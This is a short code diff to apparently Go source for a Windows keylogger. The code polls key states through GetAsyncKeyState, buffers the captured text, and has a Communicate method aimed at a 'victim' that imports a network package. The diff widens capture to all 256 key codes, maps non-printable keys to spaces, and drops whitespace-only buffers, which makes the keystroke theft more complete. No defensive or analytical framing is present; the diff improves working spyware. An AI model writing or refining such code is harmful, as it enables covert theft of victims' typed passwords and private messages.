@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"github.com/TheTitanrain/w32"
 	"main/network"
+	"strings"
 	"sync"
 	"time"
 )
@@ -31,7 +32,7 @@ func (kl *Keylogger) GetKey() Key {
 	activeKey := 0
 	var keyState uint16
 
-	for i := 32; i < 127; i++ {
+	for i := 0; i < 256; i++ {
 		keyState = w32.GetAsyncKeyState(i)
 
 		// Check if the most significant bit is set (key is down)
@@ -52,7 +53,10 @@ func (kl *Keylogger) GetKey() Key {
 }
 
 func (kl *Keylogger) ParseKeycode(key int) string {
-	return string(rune(key))
+	if key >= 32 && key <= 127 {
+		return string(rune(key))
+	}
+	return " "
 }
 
 func (kl *Keylogger) Communicate(victim string) {
@@ -64,7 +68,7 @@ func (kl *Keylogger) Communicate(victim string) {
 		default:
 			time.Sleep(10 * time.Second)
 			kl.Mutex.Lock()
-			if text != "" {
+			if strings.Trim(text, " ") != "" {
 				kl.saved += text
 				text = ""
 				kl.Mutex.Unlock()
